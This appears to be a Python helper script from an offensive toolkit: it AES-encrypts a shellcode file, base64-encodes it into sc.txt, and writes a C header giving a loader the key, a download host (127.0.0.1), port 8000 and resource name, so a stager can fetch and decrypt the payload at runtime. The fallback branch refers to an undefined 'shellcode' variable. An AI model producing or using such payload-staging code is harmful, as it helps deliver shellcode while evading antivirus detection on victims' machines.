from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto import Random
import os
import sys
import string
import random
#key = b"HrKHQxhUNxWuQxYdVEOZhoYbRcHeFmHS"
 
key = ''.join(random.choice(string.ascii_letters) for i in range(32))
key = key.encode()

if len(sys.argv) == 3:
    key = sys.argv[2].encode()
    

try:
    file = open(sys.argv[1], 'rb')
    data = file.read()
    file.close()
except IndexError:
    data = shellcode

data += b'\x00\x00\x00\x00'

iv = Random.new().read(AES.block_size)

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(data, AES.block_size))
ciphertext = b64encode(iv + enc)

file = open('sc.txt', 'w')
file.write(ciphertext.decode())
file.close()

file = open('../sc.h', 'w')
file.write('wchar_t host[] = L"127.0.0.1";\nwchar_t ressource[] = L"sc.txt";\nint port = 8000;\n')
file.write('BYTE key[] = "{}";'.format(key.decode()))


file.close()